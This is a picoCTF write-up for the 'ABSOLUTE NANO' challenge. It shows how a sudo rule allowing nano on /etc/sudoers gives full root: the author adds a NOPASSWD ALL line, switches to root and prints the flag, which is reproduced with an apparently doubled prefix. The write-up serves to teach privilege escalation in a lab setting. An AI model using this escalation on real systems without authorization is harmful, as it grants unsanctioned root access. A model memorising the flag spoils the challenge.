# 🏁 picoCTF Writeup: ABSOLUTE NANO

## 📌 Challenge Overview

Author: Darkraicg492

Description
You have complete power with nano.
Think you can get the flag?
Additional details will be available after launching your challenge instance.

## 🔍 Initial Enumeration

Running:

```bash
sudo -l
```

Output:

```bash
Matching Defaults entries for ctf-player on challenge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User ctf-player may run the following commands on challenge:
    (ALL) NOPASSWD: /bin/nano /etc/sudoers
```

---

## 🧠 Key Observation

* The user can run **nano as root** on `/etc/sudoers`
* This means we can edit the sudo configuration with **root privileges**
* This is a **dangerous misconfiguration**

---

## 🚨 Vulnerability

Although access is restricted to editing `/etc/sudoers`, the `nano` editor itself can be abused to:

* Modify sudo permissions
* Execute shell commands

---

## 💣 Exploitation Method 1: Modify Sudoers File

### 1️⃣ Open sudoers file as root

```bash
sudo nano /etc/sudoers
```

---

### 2️⃣ Add the following line at the end

```bash
ctf-player ALL=(ALL:ALL) NOPASSWD: ALL
```

---

### 3️⃣ Save and exit

* `CTRL + X`
* `Y`
* `Enter`

---

### 4️⃣ Gain root access

```bash
sudo -i
```

```bash
sudo cat flag.txt
```

## 🏁 Final Flag

```bash
picoCTF{picoCTF{n4n0_411_7h3_w4y_dd490b88}}
```
